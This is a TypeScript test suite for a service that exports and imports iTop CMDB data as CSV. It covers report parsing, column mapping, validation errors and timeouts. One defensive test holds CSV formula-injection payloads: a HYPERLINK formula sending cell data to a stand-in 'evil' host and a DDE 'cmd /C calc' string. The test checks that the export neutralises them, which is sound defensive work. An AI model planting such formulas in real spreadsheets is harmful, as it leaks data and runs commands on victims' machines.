import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { AppError } from "../src/core/errors.js";
import type { ItopClient } from "../src/itop/client.js";
import { parseCsv, remapCsv, writeCsv } from "../src/platform/transfer/csv.js";
import { parseImportReport, TRANSFER_TIMEOUT_MS, TransferService } from "../src/platform/transfer/transfer.service.js";
import { sampleSchema } from "./helpers.js";

/** import.php's output=details answer, as CSVPage writes it. */
const REPORT = [
  "#Output format: details",
  "#Class: Server",
  "#Separator: ,",
  "#Data Lines: 3",
  "#Warning: Column 'foo' is unknown and was ignored",
  "#Change tracking comment: ",
  "#Issues: 1",
  "#Warnings: 0",
  "#Created: 1",
  "#Updated: 1",
  "#Unchanged: 0",
  "Line;Status;Object Class;Object Id;name (Name)",
  "1;created;Server;41;web-01",
  "2;updated 1 cols;Server;7;db-01",
  "3;Issue: Unexpected attribute value(s);n/a;n/a;bad",
  '4;created;Server;n/a;"web; 02"',
].join("\n");

describe("parseImportReport", () => {
  it("reads the counts, every row and iTop's own remarks", () => {
    const report = parseImportReport(REPORT, true);
    assert.deepEqual(report.summary, { issues: 1, warnings: 0, created: 1, updated: 1, unchanged: 0 });
    assert.deepEqual(report.rows.map((r) => r.kind), ["created", "updated", "error", "created"]);
    // A qualified cell keeps the separator it holds.
    assert.deepEqual(report.rows[3]?.cells, ["web; 02"]);
    assert.equal(report.rows[0]?.id, "41");
    assert.deepEqual(report.columns, ["name (Name)"]);
    // The echo of the request is dropped; a real warning is kept.
    assert.deepEqual(report.messages, ["Warning: Column 'foo' is unknown and was ignored"]);
  });

  it("turns a report with no counts into a clear refusal", () => {
    assert.throws(
      () => parseImportReport("Invalid login\n", false),
      (error: unknown) => error instanceof AppError && /Invalid login/.test(error.message),
    );
  });
});

describe("TransferService.export", () => {
  const client = (response: Response) =>
    ({ postScript: async () => response }) as unknown as ItopClient;

  it("returns iTop's file when it answers with a download", async () => {
    const service = new TransferService(
      client(
        new Response("id,name\n1,web-01\n", {
          headers: { "content-type": "text/csv;charset=utf-8", "content-disposition": "attachment; filename=x.csv" },
        }),
      ),
      sampleSchema(),
    );
    const file = await service.export("Server", "SELECT Server", "csv");
    assert.equal(file.contentType, "text/csv;charset=utf-8");
    assert.match(file.filename, /^Server-\d{4}-\d{2}-\d{2}\.csv$/);
  });

  it("defuses spreadsheet formulas in a CSV export, keeping plain numbers", async () => {
    const csv = [
      "﻿id,title,delta",
      `1,"=HYPERLINK(""http://evil/?""&A1,""Click"")",-5`,
      "2,@SUM(A1),+3.2",
      `3,"-cmd|' /C calc'!A0",ok`,
      "",
    ].join("\n");
    const service = new TransferService(
      client(new Response(csv, { headers: { "content-type": "text/csv", "content-disposition": "attachment" } })),
      sampleSchema(),
    );
    const file = await service.export("Server", "SELECT Server", "csv");
    const text = new TextDecoder("utf-8", { ignoreBOM: true }).decode(await new Response(file.body).arrayBuffer());
    assert.ok(text.startsWith("﻿"), "the byte-order mark stays");
    assert.deepEqual(parseCsv(text.slice(1), ",", '"'), [
      ["id", "title", "delta"],
      ["1", `'=HYPERLINK("http://evil/?"&A1,"Click")`, "-5"],
      ["2", "'@SUM(A1)", "+3.2"],
      ["3", "'-cmd|' /C calc'!A0", "ok"],
    ]);
  });

  it("reports the page iTop rendered instead of a file", async () => {
    const service = new TransferService(
      client(new Response("<html><body>Error: Invalid OQL</body></html>", { headers: { "content-type": "text/html" } })),
      sampleSchema(),
    );
    await assert.rejects(
      () => service.export("Server", "SELECT Server", "csv"),
      (error: unknown) => error instanceof AppError && /Invalid OQL/.test(error.message),
    );
  });

  it("refuses an export column that is not an attribute", async () => {
    const service = new TransferService(client(new Response("")), sampleSchema());
    await assert.rejects(
      () => service.export("Server", "SELECT Server", "csv", "name,nope"),
      (error: unknown) => error instanceof AppError && error.status === 400,
    );
  });
});

describe("CSV for the import mapping", () => {
  it("reads qualified cells with separators, doubled qualifiers and line breaks", () => {
    const rows = parseCsv('Name,"Notes"\r\nweb-01,"a, ""b""\nc"\n\ndb-01,\n', ",", '"');
    assert.deepEqual(rows, [
      ["Name", "Notes"],
      ["web-01", 'a, "b"\nc'],
      ["db-01", ""],
    ]);
  });

  it("honours another separator and qualifier", () => {
    assert.deepEqual(parseCsv("a;'x;y'\n", ";", "'"), [["a", "x;y"]]);
  });

  it("renames headings, drops skipped columns and round-trips the cells", () => {
    const rows = parseCsv('Name,Junk,Org\nweb-01,zzz,"Demo, Inc"\n', ",", '"');
    const out = writeCsv(remapCsv(rows, ["name", null, "org_id->name"]), ",", '"');
    assert.equal(out, 'name,org_id->name\nweb-01,"Demo, Inc"\n');
    assert.deepEqual(parseCsv(out, ",", '"'), [
      ["name", "org_id->name"],
      ["web-01", "Demo, Inc"],
    ]);
  });
});

describe("TransferService.import with a mapping", () => {
  const OK = [
    "#Issues: 0",
    "#Warnings: 0",
    "#Created: 1",
    "#Updated: 0",
    "#Unchanged: 0",
    "Line;Status;Object Class;Object Id;name",
    "1;created;Server;n/a;web-01",
  ].join("\n");

  const capture = () => {
    const sent: Record<string, string>[] = [];
    const client = {
      postScript: async (_script: string, params: Record<string, string>) => {
        sent.push(params);
        return new Response(OK);
      },
    } as unknown as ItopClient;
    return { sent, service: new TransferService(client, sampleSchema()) };
  };

  it("sends iTop the file with mapped headings", async () => {
    const { sent, service } = capture();
    await service.import("Server", {
      csv: "Server name;Comment;Organization\nweb-01;ignore me;Demo\n",
      simulate: true,
      separator: ";",
      mapping: ["name", null, "org_id->name"],
      reconciliationKeys: ["name"],
    });
    assert.equal(sent[0]?.["csvdata"], "name;org_id->name\nweb-01;Demo\n");
    assert.equal(sent[0]?.["simulate"], "1");
    assert.equal(sent[0]?.["reconciliationkeys"], "name");
  });

  it("sends the file untouched without a mapping", async () => {
    const { sent, service } = capture();
    await service.import("Server", { csv: "name\nweb-01\n", simulate: true });
    assert.equal(sent[0]?.["csvdata"], "name\nweb-01\n");
  });

  for (const [why, csv, mapping] of [
    ["an unknown attribute", "A\n1\n", ["nope"]],
    ["a path on a non-picker", "A\n1\n", ["name->x"]],
    ["a column count that differs from the file", "A,B,C\n1,2,3\n", ["name", null]],
    ["two columns into one field", "A,B\n1,2\n", ["name", "name"]],
    ["a file with every column skipped", "A\n1\n", [null]],
  ] as const) {
    it(`refuses ${why}`, async () => {
      const { sent, service } = capture();
      await assert.rejects(
        () => service.import("Server", { csv, simulate: true, mapping: [...mapping] }),
        (error: unknown) => error instanceof AppError && error.status === 400,
      );
      assert.equal(sent.length, 0);
    });
  }
});

describe("TransferService at volume", () => {
  it("gives exports and imports iTop's own 300 s, not the 120 s default", async () => {
    const budgets: Array<number | undefined> = [];
    const client = {
      postScript: async (script: string, _params: Record<string, string>, options: { timeoutMs?: number } = {}) => {
        budgets.push(options.timeoutMs);
        return script.includes("export")
          ? new Response("id\n1\n", { headers: { "content-disposition": "attachment; filename=x.csv" } })
          : new Response("#Issues: 0\n#Warnings: 0\n#Created: 0\n#Updated: 0\n#Unchanged: 0\n");
      },
    } as unknown as ItopClient;
    const service = new TransferService(client, sampleSchema());
    await service.export("Server", "SELECT Server", "csv");
    await service.import("Server", { csv: "name\nweb-01\n", simulate: true });
    assert.deepEqual(budgets, [TRANSFER_TIMEOUT_MS, TRANSFER_TIMEOUT_MS]);
    assert.equal(TRANSFER_TIMEOUT_MS, 300_000);
  });
});
